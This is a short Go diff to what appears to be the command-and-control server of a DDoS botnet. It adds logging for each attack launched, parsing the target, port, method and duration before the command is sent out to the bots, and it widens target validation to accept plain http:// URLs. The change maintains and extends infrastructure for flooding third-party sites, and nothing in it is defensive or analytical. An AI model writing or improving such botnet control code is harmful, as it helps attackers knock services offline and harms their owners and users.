@@ -72,6 +72,10 @@ func (c *Connection) CommandHandler() error {
 					return nil
 				}
 
+				cmd := strings.Split(_command, " ")
+				l := c.NewLog(ATTACK_STARTED, cmd[1], strings.TrimPrefix(cmd[0], "!"), cmd[3], cmd[2])
+				go l.SendLog()
+
 				go bot_server.SendCommand(_command)
 				bc := bot_server.BotCount
 				botsc := strings.ReplaceAll(c.config.Cnc.CommandSent, "{bots}", strconv.Itoa(bc))
@@ -118,7 +122,7 @@ func (c *Connection) isSyntaxError(command string, cmdinfo MethodsInfo) bool {
 		}
 
 	} else {
-		if !strings.HasPrefix(cmd[1], "https://") {
+		if !strings.HasPrefix(cmd[1], "https://") && !strings.HasPrefix(cmd[1], "http://") {
 			return true
 		}
 	}
